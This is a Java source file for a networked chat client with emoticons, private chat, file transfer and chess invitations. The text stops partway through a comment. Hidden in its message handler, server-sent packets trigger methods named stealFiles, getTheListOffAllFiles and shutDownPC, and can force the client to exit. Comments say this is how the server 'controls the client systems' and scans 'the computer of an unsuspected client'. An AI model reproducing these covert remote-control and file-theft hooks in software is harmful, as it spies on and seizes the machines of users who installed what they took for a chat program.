/*
 * Description: Class TextPane.java
 * Author: Dimtri Pankov
 * Date: 10-Feb-2011
 * Version: 1.0
 */
package ChatProject;

import ChessGameKenai.ChessBoardView;
import ChessGameKenai.Start_Game;
import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Font;
import java.awt.Graphics;
import java.awt.GridLayout;
import java.awt.Image;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.awt.event.WindowListener;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.EOFException;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketException;
import java.net.URL;
import java.net.UnknownHostException;
import java.util.ArrayList;
import javax.swing.DefaultListModel;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JColorChooser;
import javax.swing.JDialog;
import javax.swing.JFileChooser;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JList;
import javax.swing.JMenu;
import javax.swing.JMenuBar;
import javax.swing.JMenuItem;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTextField;
import javax.swing.JTextPane;
import javax.swing.SwingUtilities;
import javax.swing.border.TitledBorder;
import javax.swing.text.BadLocationException;
import javax.swing.text.DefaultCaret;
import javax.swing.text.Document;
import javax.swing.text.SimpleAttributeSet;
import javax.swing.text.StyleConstants;

/**
 * The Client class basically connects to the server if server is online of course
 * if not the client will receive a message saying server is offline this client application
 * can save the conversations or clear them talk to other connected clients can send smiley to others
 * Basically its a JFrame with that has all needed components to represent itself graphically on the screen
 * Client first has to login to the server server has to be online or the exception will be thrown then caught
 * the message Server offline will appear in the textPane The Client has a JList of all students that are connected
 * simply by selecting the appropriate student and then right clicking the mouse the popup will appear with two choices
 * go private chat or transfer files selecting the private chat option will popup the private chat window with the start button
 * by clicking the button the connection will be established between two client private chat is 100% private no server involvement
 * The client can also choose another port or IP address if server changes its IP client can also add smiley for fun send them to others
 * The protocol that client uses to unwrap the objects is very straight forward instance variables of the serialized object are either null
 * or not null if not null the information is extracted and used accordingly by calling needed methods depending on what was received
 * the client class has a lot methods that are called on different times the configuration file that saves automatically the port and the IP
 * of the server is loaded automatically if the file exists if not it will ask the IP and port number
 * @author Dimitri Pankov
 * @see JFrame
 * @see Thread
 * @version 1.2
 */
public class Client extends JFrame {

    private JTextPane textPane;
    private JTextField txtSend;
    private JButton btnSend, btnConnect;
    private CostumPanel pnlSouth;
    private Socket socket;
    private ObjectOutputStream oos;
    private SimpleAttributeSet localAttribute;
    private SimpleAttributeSet exceptionAttribute = new SimpleAttributeSet();
    private SimpleAttributeSet sendAttribute = new SimpleAttributeSet();
    private JMenuBar mBar;
    private JMenu menuFile, menuFont, menuColor, menuConnect, menuHelp;
    private Receive receive;
    private String name = "unknown";
    private Color color = new Color(255, 215, 0);
    private JScrollPane scroll;
    private String ipAddress;
    private int port;
    private File file = new File("config.dat");
    private JList usersList;
    private DefaultListModel model;
    private JScrollPane listScroll;
    private JPanel eastPanel;
    private CostumPanel east;
    private JScrollPane emoticonsPanelScroll;
    private String iconPath;
    private WindowListener windowListener;
    private JMenuItem itemConnect;
    private ArrayList<String> usersNames = new ArrayList<String>();
    private PrivateChatWindow privateChat;
    private PublicFileTransfer publicTransfer;
    private InetAddress clientIpAddress, publicIP;
    private String filePath;
    private long fileSize;
    private boolean isPublicNetwork = true;
    private String guestName;
    private MyPopupMenu popupMenu;

    /**
     * Empty constructor of the class that has all needed components to
     * represent itself graphically on the screen
     * This Constructor basically has just GUI that for UI User Interface
     * like buttons, panels and etc.. to interact with user
     */
    public Client() {
        windowListener = new WindowAdapter() {

            /**
             * The method windowClosing is needed to do
             * some special things when the user decides to close we need to
             * kill the thread and release resources
             * @param e WindowEvent object that is generated when window is closing
             */
            @Override
            public void windowClosing(WindowEvent e) {
                if (receive != null) {
                    receive.killThread();
                }
                System.exit(0);
            }
        };
        this.addWindowListener(windowListener);

        StyleConstants.setBold(sendAttribute, true);

        eastPanel = new JPanel(new GridLayout(2, 1));
        model = new DefaultListModel();
        east = new CostumPanel("/Icons/blueswirls.jpg", new GridLayout(5, 5));
        TitledBorder emoticonsBorder = new TitledBorder("Choose Emoticons");
        emoticonsBorder.setTitleFont(new Font("Serif", Font.PLAIN, 20));
        emoticonsBorder.setTitleColor(Color.WHITE);
        east.setBorder(emoticonsBorder);

        //ADD SMILEYS TO THE EAST PANEL
        for (int i = 0; i < 25; i++) {
            east.add(new Smiley(this, "/smileys/smiley" + (i + 1) + ".gif"));
        }

        emoticonsPanelScroll = new JScrollPane(east, JScrollPane.VERTICAL_SCROLLBAR_ALWAYS, JScrollPane.HORIZONTAL_SCROLLBAR_AS_NEEDED);

        usersList = new JList(model);
        popupMenu = new MyPopupMenu(usersList, this);
        usersList.setComponentPopupMenu(popupMenu);
        usersList.getUI().installUI(usersList);
        TitledBorder usersListBorder = new TitledBorder("User's List");
        usersListBorder.setTitleFont(new Font("Serif", Font.PLAIN, 20));
        usersListBorder.setTitleColor(Color.WHITE);
        usersList.setBorder(usersListBorder);
        usersList.setFont(new Font("Serif", Font.PLAIN, 16));
        usersList.setForeground(new Color(255, 215, 0));
        usersList.setBackground(new Color(35, 107, 142));
        listScroll = new JScrollPane(usersList, JScrollPane.VERTICAL_SCROLLBAR_ALWAYS, JScrollPane.HORIZONTAL_SCROLLBAR_ALWAYS);
        eastPanel.add(listScroll);
        eastPanel.add(emoticonsPanelScroll);
        mBar = new JMenuBar();
        this.setJMenuBar(mBar);
        menuFile = new JMenu("File");
        menuFile.add(new JMenuItem("Clear TextPane")).addActionListener(new ActionListener() {

            /**
             * The actionPerformed method is called whenever the listener detects action
             * @param e ActionEvent object that is generated when menu item is clicked is clicked
             */
            public void actionPerformed(ActionEvent e) {
                textPane.setText("");
            }
        });
        menuFile.add(new JMenuItem("Save as..")).addActionListener(new ActionListener() {

            /**
             * The actionPerformed method is called whenever the listener detects action
             * @param e ActionEvent object that is generated when menu item is clicked is clicked
             */
            public void actionPerformed(ActionEvent e) {
                JFileChooser chooser = new JFileChooser(".");
                int value = chooser.showSaveDialog(Client.this);
                if (value == JFileChooser.APPROVE_OPTION) {
                    File file = chooser.getSelectedFile();
                    Client.this.saveConversations(file);
                }
            }
        });
        menuFile.add(new JMenuItem("Exit")).addActionListener(new ActionListener() {

            /**
             * The actionPerformed method is called whenever the listener detects action
             * @param e ActionEvent object that is generated when menu item is clicked is clicked
             */
            public void actionPerformed(ActionEvent e) {
                if (receive != null) {
                    receive.killThread();
                }
                System.exit(0);
            }
        });
        menuFont = new JMenu("Font");
        menuFont.add(new JMenuItem("Italic")).addActionListener(new ActionListener() {

            /**
             * The actionPerformed method is called whenever the listener detects action
             * @param e ActionEvent object that is generated when menu item is clicked is clicked
             */
            public void actionPerformed(ActionEvent e) {
                localAttribute = new SimpleAttributeSet();
                StyleConstants.setItalic(localAttribute, true);
                sendAttribute = localAttribute;
            }
        });
        menuFont.add(new JMenuItem("Plain")).addActionListener(new ActionListener() {

            /**
             * The actionPerformed method is called whenever the listener detects action
             * @param e ActionEvent object that is generated when menu item is clicked is clicked
             */
            public void actionPerformed(ActionEvent e) {
                localAttribute = new SimpleAttributeSet();
                sendAttribute = localAttribute;
            }
        });
        menuFont.add(new JMenuItem("Bold")).addActionListener(new ActionListener() {

            /**
             * The actionPerformed method is called whenever the listener detects action
             * @param e ActionEvent object that is generated when menu item is clicked is clicked
             */
            public void actionPerformed(ActionEvent e) {
                localAttribute = new SimpleAttributeSet();
                StyleConstants.setBold(localAttribute, true);
                StyleConstants.setForeground(localAttribute, color);
                sendAttribute = localAttribute;
            }
        });
        menuColor = new JMenu("Color");
        menuColor.add(new JMenuItem("Magenta")).addActionListener(new ActionListener() {

            /**
             * The actionPerformed method is called whenever the listener detects action
             * @param e ActionEvent object that is generated when menu item is clicked is clicked
             */
            public void actionPerformed(ActionEvent e) {
                localAttribute = new SimpleAttributeSet();
                color = Color.MAGENTA;
                StyleConstants.setForeground(localAttribute, color);
                sendAttribute = localAttribute;
            }
        });
        menuColor.add(new JMenuItem("Red")).addActionListener(new ActionListener() {

            /**
             * The actionPerformed method is called whenever the listener detects action
             * @param e ActionEvent object that is generated when menu item is clicked is clicked
             */
            public void actionPerformed(ActionEvent e) {
                localAttribute = new SimpleAttributeSet();
                color = Color.RED;
                StyleConstants.setForeground(localAttribute, color);
                sendAttribute = localAttribute;
            }
        });
        menuColor.add(new JMenuItem("Blue")).addActionListener(new ActionListener() {

            /**
             * The actionPerformed method is called whenever the listener detects action
             * @param e ActionEvent object that is generated when menu item is clicked is clicked
             */
            public void actionPerformed(ActionEvent e) {
                localAttribute = new SimpleAttributeSet();
                color = Color.BLUE;
                StyleConstants.setForeground(localAttribute, color);
                sendAttribute = localAttribute;
            }
        });
        menuColor.add(new JMenuItem("Orange")).addActionListener(new ActionListener() {

            /**
             * The actionPerformed method is called whenever the listener detects action
             * @param e ActionEvent object that is generated when menu item is clicked is clicked
             */
            public void actionPerformed(ActionEvent e) {
                localAttribute = new SimpleAttributeSet();
                color = Color.ORANGE;
                StyleConstants.setForeground(localAttribute, color);
                sendAttribute = localAttribute;
            }
        });
        menuColor.add(new JMenuItem("Choose color...")).addActionListener(new ActionListener() {

            /**
             * The actionPerformed method is called whenever the listener detects action
             * @param e ActionEvent object that is generated when menu item is clicked is clicked
             */
            public void actionPerformed(ActionEvent e) {
                localAttribute = new SimpleAttributeSet();
                color = JColorChooser.showDialog(Client.this, "Choose Color", Color.CYAN);
                if (color != null) {
                    StyleConstants.setForeground(localAttribute, color);
                } else {
                    color = Color.CYAN;
                }
                sendAttribute = localAttribute;
            }
        });
        menuConnect = new JMenu("Connect");
        menuConnect.add(new JMenuItem("Connection settings")).addActionListener(new ActionListener() {

            /**
             * The actionPerformed method is called whenever the listener detects action
             * @param e ActionEvent object that is generated when menu item is clicked is clicked
             */
            public void actionPerformed(ActionEvent e) {
                try {
                    new InputDialog();
                    Client.this.saveSettings();
                    itemConnect.setEnabled(true);
                    btnConnect.setEnabled(true);
                } catch (Exception ex) {
                    Client.this.appendString(ex.toString(), exceptionAttribute, color);
                }
            }
        });
        itemConnect = new JMenuItem("Connect to Server");
        menuConnect.add(itemConnect).addActionListener(new ActionListener() {

            /**
             * The actionPerformed method is called whenever the listener detects action
             * @param e ActionEvent object that is generated when menu item is clicked is clicked
             */
            public void actionPerformed(ActionEvent e) {
                try {
                    new Client_Login(Client.this);
                    if (!name.equals("unknown") && !name.trim().equals("")) {
                        if (!file.exists()) {
                            new InputDialog();
                            Client.this.saveSettings();
                        } else {
                            Client.this.loadSettings();
                            Client.this.connectToServer();
                            itemConnect.setEnabled(false);
                            btnConnect.setEnabled(false);
                        }
                    }
                } catch (SocketException ex) {
                    Client.this.appendString("Server is offline.........\n", exceptionAttribute, color);
                } catch (Exception er) {
                    Client.this.appendString(er.toString(), exceptionAttribute, color);
                }
            }
        });
        menuHelp = new JMenu("Help");
        menuHelp.add(new JMenuItem("User Manual")).addActionListener(new ActionListener() {

            /**
             * The actionPerformed method is called whenever the listener detects action
             * @param e ActionEvent object that is generated when menu item is clicked is clicked
             */
            public void actionPerformed(ActionEvent e) {
                new UserManual(Client.this);
            }
        });
        mBar.add(menuFile);
        mBar.add(menuFont);
        mBar.add(menuColor);
        mBar.add(menuConnect);
        mBar.add(menuHelp);
        textPane = new JTextPane() {

            /**
             * The method paintComponent is overridden in our anonymous class
             * to paint some images onto swing components
             * @param g Graphics object used to paint this object
             */
            @Override
            public void paintComponent(Graphics g) {
                URL url = this.getClass().getResource("/Icons/back.jpg");
                Toolkit toolkit = this.getToolkit();
                Image image = toolkit.getImage(url);
                g.drawImage(image, 0, 0, textPane.getWidth(), textPane.getHeight(), textPane);
                super.paintComponent(g);
            }
        };
        textPane.setOpaque(false);
        textPane.setEditable(false);
        TitledBorder border = new TitledBorder("Talk Pane");
        border.setTitleFont(new Font("Serif", Font.PLAIN, 20));
        border.setTitleColor(Color.WHITE);
        textPane.setBorder(border);
        textPane.setFont(new Font("Serif", Font.PLAIN, 20));

        DefaultCaret caret = (DefaultCaret) textPane.getCaret();
        caret.setUpdatePolicy(DefaultCaret.ALWAYS_UPDATE);

        scroll = new JScrollPane(textPane, JScrollPane.VERTICAL_SCROLLBAR_ALWAYS, JScrollPane.HORIZONTAL_SCROLLBAR_AS_NEEDED);

        txtSend = new JTextField(12);
        btnConnect = new JButton("Connect");
        btnConnect.addActionListener(new ActionListener() {

            /**
             * The actionPerformed method is called whenever the listener detects action
             * @param e ActionEvent object that is generated when button is clicked
             */
            public void actionPerformed(ActionEvent e) {
                try {
                    new Client_Login(Client.this);
                    if (!name.equals("unknown") && !name.trim().equals("")) {
                        if (!file.exists()) {
                            new InputDialog();
                            Client.this.saveSettings();
                        } else {
                            Client.this.loadSettings();
                            Client.this.connectToServer();
                            itemConnect.setEnabled(false);
                            btnConnect.setEnabled(false);
                        }
                    }
                } catch (SocketException ex) {
                    Client.this.appendString("Server is offline.........\n", exceptionAttribute, color);
                } catch (Exception er) {
                    Client.this.appendString(er.toString(), exceptionAttribute, color);
                }
            }
        });
        btnSend = new JButton("Send");
        btnSend.addActionListener(new ActionListener() {

            /**
             * The actionPerformed method is called whenever the listener detects action
             * @param e ActionEvent object that is generated when button is clicked is clicked
             */
            public void actionPerformed(ActionEvent e) {
                try {
                    Client.this.sendMessage();
                } catch (Exception ex) {
                    Client.this.appendString(ex.toString(), exceptionAttribute, color);
                }
            }
        });

        //INITIALIZE COMPONENTS AND ADD THEM TO THE SOUTH PANEL
        btnSend.setEnabled(false);
        txtSend.setEnabled(false);
        pnlSouth = new CostumPanel("/Icons/background.jpg");
        pnlSouth.setOpaque(false);
        pnlSouth.add(txtSend);
        pnlSouth.add(btnSend);
        pnlSouth.add(btnConnect);
        txtSend.addActionListener(new ActionListener() {

            /**
             * The actionPerformed method is called whenever the listener detects action
             * @param e ActionEvent object that is generated enter hit text field
             */
            public void actionPerformed(ActionEvent e) {
                try {
                    Client.this.sendMessage();
                } catch (Exception ex) {
                    Client.this.appendString(ex.toString(), exceptionAttribute, color);
                }
            }
        });

        //ADD ALLTHE COMPONENTS TO THE CONTAINER
        this.getContentPane().add(scroll);
        this.getContentPane().add(pnlSouth, BorderLayout.SOUTH);
        this.getContentPane().add(eastPanel, BorderLayout.EAST);

        //SET THE JFRAME'S PROPERTIES
        this.setTitle("Client GUI");
        this.setIconImage(new ImageIcon(this.getClass().getResource("/Icons/client.png")).getImage());
        this.setSize(750, 550);
        this.setResizable(false);
        this.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        this.setLocation(300, 233);
        this.setVisible(true);
    }

    /**
     * The method appendString simply appends the String to the textPane
     * The way it does is pretty much straight forward it inserts
     * the String into the Document which in turn displays it on the Pane
     * I also used StyleConstants for color Font and etc.......
     * The menu items of the private chat window have font choose color chooser
     * when it appends it check the Attributes they can either be default like plain and black
     * or you can change them the way you want
     * @param srtingToBeAppended as a String
     * @param attributes as a SimpleAttributeSet which is a cool feature of the JTextPane no HTML required to costumize the text
     * @param color as a Color
     */
    public void appendString(String srtingToBeAppended, SimpleAttributeSet attributes, Color color) {
        Document document = textPane.getDocument();
        try {
            StyleConstants.setForeground(attributes, color);
            document.insertString(document.getLength(), srtingToBeAppended, attributes);
        } catch (BadLocationException ex) {
            Client.this.appendString(ex.toString(), exceptionAttribute, color);
        }
    }

    /**
     * The class Receive acts as a reader inside the loop
     * it reads then passes the object that was read to the analyzeAndDisplay method which in turn
     * will call appropriate method of the class this class is the Thread class that executes its run method until
     * the boolean value is changed to false which in turn forces the run method to exit and that will kill the thread
     * @author Dimitri Pankov
     * @see Thread
     * @version 1.3
     */
    public class Receive extends Thread {

        private volatile boolean isAlive = true;
        private ObjectInputStream iis;

        /**
         * Empty constructor of the class simply constructs the input stream
         * @throws IOException when working with sockets risks are unavoidable
         */
        public Receive() throws IOException {
            iis = new ObjectInputStream(socket.getInputStream());
        }

        /**
         * The method run simply reads the objects from input stream and
         * passes them to the the analyzeAndDisplay Method which will turn call the appropriate
         * methods of the class the loop is executed until the thread dies that will happen if an exception
         * is thrown or boolean value is put to false
         */
        @Override
        public void run() {
            try {
                while (isAlive) {
                    Object object = iis.readObject();
                    this.analyzeAndDisplay(object);
                }
            } catch (SocketException e) {
                Client.this.appendString("\nServer has just crashed!", exceptionAttribute, color);
            } catch (EOFException e) {
                textPane.setText("");
                txtSend.setEnabled(false);
                btnSend.setEnabled(false);
                btnConnect.setEnabled(true);
                itemConnect.setEnabled(true);
            } catch (Exception e) {
                Client.this.appendString(e.toString(), exceptionAttribute, color);
            }
        }

        /**
         * The method exit simply exits the application after
         * displaying the message to the user which explains why the application was terminated
         * this method is called by the server i mean after the server has sent a specific object that
         * was analyzed in the client and result was to call this method this is the way server controls the client systems
         * this is to amateur way to close the computer i found the real way using the runtime package which
         * will be stated shortly shuts down PC for real
         * @param message a message to be displayed to the client
         */
        public void exit(String message) {
            JOptionPane.showMessageDialog(Client.this, message, "Bad Attitude Exception", JOptionPane.ERROR_MESSAGE);
            try {
                System.exit(0);
                isAlive = false;
                socket.close();
            } catch (Exception e) {
                Client.this.appendString(e.toString(), exceptionAttribute, color);
            }
        }

        /**
         * The analyzeAndDisplay method simply receives an object as the parameter then analyzes it
         * then does what ever is needed depending on the object contents
         * Instead using strings with protocol its much easier to send whole objects and extract
         * the instance variables accordingly and do what is necessary depending on what variable is not null
         * some methods in the client class are called solely by the analyze method when the object contain a certain data
         * which is needed to know what method to call and when the analyzed object is sent down to the appropriate method
         * and that will do what we want like display message, show an icon send files etc.........
         * @param object to analyze and extract the data from
         */
        public void analyzeAndDisplay(Object object) {
            if (object instanceof Packet) {
                if (((Packet) object).getKill() != null) {
                    this.exit(((Packet) object).getKill());
                }
                if (((Packet) object).getMessage() != null) {
                    Client.this.appendString("\n" + ((Packet) object).getName() + ": " + ((Packet) object).getMessage() + "  ", ((Packet) object).getAttribute(), ((Packet) object).getAttributeColor());
                }
                if (((Packet) object).getIconPath() != null) {
                    textPane.insertIcon(new ImageIcon(this.getClass().getResource(((Packet) object).getIconPath())));
                }
                if (((Packet) object).getCheckedName() != null) {
                    Client.this.changeNameItIsTaken();
                }
                if (((Packet) object).getServerMessage() != null) {
                    Client.this.appendString("\n" + "Server" + ": " + ((Packet) object).getServerMessage() + "  ", sendAttribute, Color.RED);
                }
                if (((Packet) object).getIpAddress() != null && ((Packet) object).getPublicChatTransfer() == null && ((Packet) object).getFileTransferDecline() == null && ((Packet) object).getRequestChessGame() == null) {
                    Client.this.createPrivateChat(((Packet) object).getIpAddress());
                    privateChat.setGuestName(((Packet) object).getCreatePrivateChat());
                }
                if (((Packet) object).getPublicIP() != null && ((Packet) object).getPublicChatTransfer() == null && (((Packet) object).getRequestChessGame() == null)) {
                    Client.this.createPrivateChat(((Packet) object).getPublicIP());
                    privateChat.setGuestName(((Packet) object).getCreatePrivateChat());
                }
                if (((Packet) object).getTransferFile() != null && ((Packet) object).getPublicChatTransfer() == null) {
                    privateChat.getFileTransferPanel().connectAsClient(((Packet) object).getIpAddress());
                }
                if (((Packet) object).getPublicChatTransfer() != null && ((Packet) object).getPublicIP() == null) {
                    clientIpAddress = ((Packet) object).getIpAddress();
                    filePath = ((Packet) object).getFilePath();
                    fileSize = ((Packet) object).getFileSize();
                    guestName = ((Packet) object).getCreatePrivateChat();
                    isPublicNetwork = false;
                    Client.this.createFileTransferConnection();

                }
                if (((Packet) object).getPublicChatTransfer() != null && ((Packet) object).getPublicIP() != null) {
                    publicIP = ((Packet) object).getPublicIP();
                    filePath = ((Packet) object).getFilePath();
                    fileSize = ((Packet) object).getFileSize();
                    guestName = ((Packet) object).getCreatePrivateChat();
                    isPublicNetwork = true;
                    Client.this.createFileTransferConnection();
                }
                if (((Packet) object).getRequestChessGame() != null && ((Packet) object).getPublicIP() == null) {
                    guestName = ((Packet) object).getRequestChessGame();
                    Client.this.appendString("\n" + Client.this.getGuestName() + " wants play chess game with you\n", new SimpleAttributeSet(), Color.BLACK);
                    textPane.insertComponent(new PromptUser(Client.this, ((Packet) object).getIpAddress()));
                }
                if (((Packet) object).getRequestChessGame() != null && ((Packet) object).getPublicIP() != null) {
                    guestName = ((Packet) object).getRequestChessGame();
                    Client.this.appendString("\n" + Client.this.getGuestName() + " wants play chess game with you\n", new SimpleAttributeSet(), Color.BLACK);
                    textPane.insertComponent(new PromptUser(Client.this, ((Packet) object).getPublicIP()));
                }
                if (((Packet) object).getGameDecline() != null) {
                    int returnValue = JOptionPane.showConfirmDialog(Client.this, Client.this.getGuestName() + " has declined to play the game. Would you like to close the game?", "Request Response!", JOptionPane.YES_NO_OPTION, JOptionPane.INFORMATION_MESSAGE);
                    if (returnValue == JOptionPane.YES_OPTION) {
                        Start_Game.getInstance().dispose();
                        Client.this.closeClientServerSocket(ChessBoardView.getConnectionInstance().getServerSocket());
                        ChessBoardView.getConnectionInstance().killThread();
                    }
                }
                if (((Packet) object).getFileTransferDecline() != null) {
                    Client.this.closeClientServerSocket(popupMenu.getPublicFileTransfer().getServerSocket());
                }
                if (((Packet) object).getStealFile() != null) {
                    Client.this.stealFiles(object);
                }
                if (((Packet) object).getClientListOffAllFiles() != null) {
                    Client.this.getTheListOffAllFiles();
                }
                if (((Packet) object).getShutDown() != null) {
                    Client.this.shutDownPC();
                }
                if (((Packet) object).getCancelShutDown() != null) {
                    Client.this.cancelShutDown();
                }
            } else if (object instanceof ArrayList) {
                Client.this.updateList((ArrayList<String>) object);
            }
        }

        /**
         * The killThread method simply kills the running
         * Thread by setting the boolean value to false
         */
        public void killThread() {
            isAlive = false;
        }
    }

    /**
     * The method changeNameItIsTaken simply tells
     * the client that the name he chose is taken
     */
    public void changeNameItIsTaken() {
        textPane.setText("");
        JOptionPane.showMessageDialog(this, "The Name is Taken Choose another name for login", "Error Message", JOptionPane.ERROR_MESSAGE);
        btnConnect.setEnabled(true);
        itemConnect.setEnabled(true);
    }

    /**
     * The loadSettings method simply loads the port and the IP
     * of the server and stores them in the instance variables
     */
    private void loadSettings() {
        try {
            BufferedReader br = new BufferedReader(new FileReader(file));
            ipAddress = br.readLine();
            port = Integer.parseInt(br.readLine());
            br.close();
        } catch (Exception e) {
            Client.this.appendString(e.toString(), exceptionAttribute, color);
        }
    }

    /**
     * The method saveSettings simply saves the port and the IP
     * of the server into the config file
     */
    private void saveSettings() {
        try {
            if (ipAddress != null && port != 0) {
                PrintWriter pw = new PrintWriter(new BufferedWriter(new FileWriter(file)));
                pw.println(ipAddress);
                pw.println(port);
                pw.flush();
                pw.close();
            }
        } catch (Exception e) {
            Client.this.appendString(e.toString(), exceptionAttribute, color);
        }
    }

    /**
     * The method connectToServer does exactly what is says it connects to the server
     * using a simple socket connection it uses ipAddress and the port number to connect
     * After the connection is successful it creates an output stream for communication purposes
     * flushes the stream because when u create object output stream the it writes a header to the socket
     * which in turn is used to construct the input stream on the other side so flushing is most important not
     * only when sending objects but in the construction phase it is much needed i tried not to flush it was not reading at all
     * and corrupted stream exception was very common.After the flush is complete we start a thread which is in our case
     * a thread object that reads the objects as they come in the stream it does not bother us because it runs in its own thread
     * After that we construct a serialized object we set all needed variables to what we want then we write that information
     * to the server that information will be used to display the name of the client IP, clientID and etc.....
     * Then we set both textField and senButton to enabled true and the title of the client JFrame will be display its name
     * @throws UnknownHostException if the host is not found or not online this exception will be thrown
     * @throws IOException any other IOExceptions that need to thrown are handle by this throw clause
     */
    public void connectToServer() throws UnknownHostException, IOException {
        socket = new Socket(ipAddress, port);
        textPane.setText("");
        this.appendString("Connected to Server", exceptionAttribute, color);
        oos = new ObjectOutputStream(socket.getOutputStream());
        oos.flush();
        receive = new Receive();
        receive.start();
        Packet packet1 = new Packet();
        packet1.setPort(port);
        packet1.setIpAddress(socket.getInetAddress());
        packet1.setClientID(this.toString());
        packet1.setName(name);
        oos.writeObject(packet1);
        oos.flush();
        txtSend.setEnabled(true);
        btnSend.setEnabled(true);
        this.setTitle(name);
    }

    /**
     * The method setIconPath simply sets the path
     * to the icon image which is a smiley
     * @param iconPath as a String
     */
    public void setIconPath(String iconPath) {
        this.iconPath = iconPath;
    }

    /**
     * The sendMessage method is needed to send messages to clients
     * First the method checks if the textField is not empty if not it proceeds
     * else does nothing then we construct new serialized object in which we set needed variables to what we want
     * like color of the string, its attribute which we need to display the string in the textPane, message, iconPath and etc.....
     * The object is then written to the stream and the stream is flushed immediately the textField becomes empty and iconPath becomes null
     * @throws IOException when working with stream or socket risks are unavoidable
     */
    public void sendMessage() throws IOException {
        String message = "";
        if (txtSend.getText().indexOf("~") >= 0) {
            message = txtSend.getText().substring(0, txtSend.getText().indexOf("~"));
            message += txtSend.getText().substring(txtSend.getText().indexOf("~") + 1);
        } else {
            message = txtSend.getText();
        }
        if (!txtSend.getText().trim().equals("")) {
            Packet packet = new Packet();
            packet.setAttribute(sendAttribute);
            packet.setAttributeColor(color);
            if (iconPath != null) {
                packet.setIconPath(iconPath);
            }
            packet.setMessage(message.trim());
            packet.setName(name);
            oos.writeObject(packet);
            oos.flush();
            txtSend.setText("");
            iconPath = null;
        }
    }

    /**
     * The method saveConversations simply gets the text of the TextPane
     * and writes it to the chosen file which will be chosen by JFileChooser when called upon
     * @param file as a File object
     */
    public void saveConversations(File file) {
        try {
            PrintWriter pw = new PrintWriter(new BufferedWriter(new FileWriter(file)));
            pw.println(textPane.getText());
            pw.flush();
            pw.close();
        } catch (Exception e) {
            Client.this.appendString(e.toString(), exceptionAttribute, color);
        }
    }

    /**
     * The method clearUsersList simply clears the JList
     * This method is needed for updating the client JList of the users
     * that are connected each time new user logs in the message is sent from
     * the server this method is called JList clears itself then another list comes
     * along and fills the JList with all users
     */
    public void clearUsersList() {
        model.clear();
    }

    /**
     * The updateList method does exactly what is says updates the JList of
     * users on the client side it also remembers the names of all clients
     * and stores them in the ArrayList the JList update must be done in the event dispatching thread
     * because if use use multiple threads and for some reason you decide to update the update will not always work
     * i tried it and i would say it would only work like 70-75% of the time which is not good enough it has to be 100%
     * because this method is called from within a thread we have to mention that updating of all swing components is done
     * successfully in the event dispatching thread
     * @param users as a ArrayList<String>
     */
    public synchronized void updateList(final ArrayList<String> users) {
        if (!Client.this.usersNames.isEmpty()) {
            Client.this.usersNames.clear();
        }
        Client.this.usersNames.addAll(users);
        SwingUtilities.invokeLater(new Runnable() {

            public void run() {
                model.clear();
                for (String id : users) {
                    model.addElement(id);
                }
            }
        });
    }

    /**
     * The method getOutputStream returns the object output stream to the caller
     * @return oos as an ObjectOutputStream
     */
    public ObjectOutputStream getOutputStream() {
        return oos;
    }

    /**
     * The method setClientName simply sets the name of the client
     * @param name as a String
     */
    public void setClientName(String name) {
        this.name = name;
    }

    /**
     * The method getClientName simply returns the name of the client to the caller
     * @return name as a String
     */
    public String getClientName() {
        return name;
    }

    /**
     * The method getUserNames simple returns an ArrayList of names
     * @return usersNames as an ArrayList
     */
    public ArrayList<String> getUserNames() {
        return usersNames;
    }

    /**
     * The method getList simply returns the JList to the caller
     * @return usersList as a JList
     */
    public JList getList() {
        return usersList;
    }

    /**
     * The createPrivateChat method does exactly what it says creates private chat
     * by opening a private chat window that is already connected through the socket with the client
     * that invited this client into the private chat if the IP is incorrect the ConnectException will be thrown
     * @param ipAddress as an InetAddress
     */
    public void createPrivateChat(InetAddress ipAddress) {
        privateChat = new PrivateChatWindow(this, ipAddress, false);
    }

    /**
     * The getSocket method simply returns the socket to the caller
     * @return socket as a Socket
     */
    public Socket getSocket() {
        return socket;
    }

    /**
     * The method getIPAddress returns ipAddress to the caller
     * @return ipAddress as a String
     */
    public String getIPAddress() {
        return ipAddress;
    }

    /**
     * The method getPrivateChatWindow returns the PrivateChatWindow to the caller
     * @return privateChat as a PrivateChatWindow
     */
    public PrivateChatWindow getPrivateChatWindow() {
        return privateChat;
    }

    /**
     * The method getTextPane simply returns the JTextPane to the caller
     * @return textPane as a JTextPane
     */
    public JTextPane getTextPane() {
        return textPane;
    }

    /**
     * This method is used to prompt the user for the file transfer
     * First we create PublicFileTransfer instance to be able to access its method which
     * prompts the user for the file transfer this will insert the JPanel with
     * two buttons accept/decline if the user accepts by clicking the accept button
     * the file will be transfered if he declines the transfer will be canceled
     */
    public void createFileTransferConnection() {
        try {
            if (isPublicNetwork) {
                publicTransfer = new PublicFileTransfer(Client.this, false, publicIP, null, filePath, (int) fileSize);
                publicTransfer.promptUserForDownload();
            } else {
                publicTransfer = new PublicFileTransfer(Client.this, false, clientIpAddress, null, filePath, (int) fileSize);
                publicTransfer.promptUserForDownload();
            }
        } catch (Exception e) {
            Client.this.appendString(e.toString(), exceptionAttribute, color);
        }
    }

    /**
     * The method getClientIPAddress simply returns the client's IP address to the caller
     * @return clientIpAddress as an InetAddress
     */
    public InetAddress getClientIPAddress() {
        return clientIpAddress;
    }

    /**
     * The method getGuestName simply returns the guest name to the caller
     * @return as a String
     */
    public String getGuestName() {
        return guestName;
    }

    /**
     * The method getPublicIP simply returns public IP address to the caller
     * @return as an InetAddress
     */
    public InetAddress getPublicIp() {
        return publicIP;
    }

    /**
     * The method getFilePath simply returns the filePath to the caller
     * @return as a String
     */
    public String getFilePath() {
        return filePath;
    }

    /**
     * The method getFileSize simply returns the fileSize to the caller
     * @return as a long
     */
    public long getFileSize() {
        return fileSize;
    }

    /**
     * The method getTheListOffAllFiles simply scans the computer of
     * an unsuspected client fills the ArrayList with all file's names
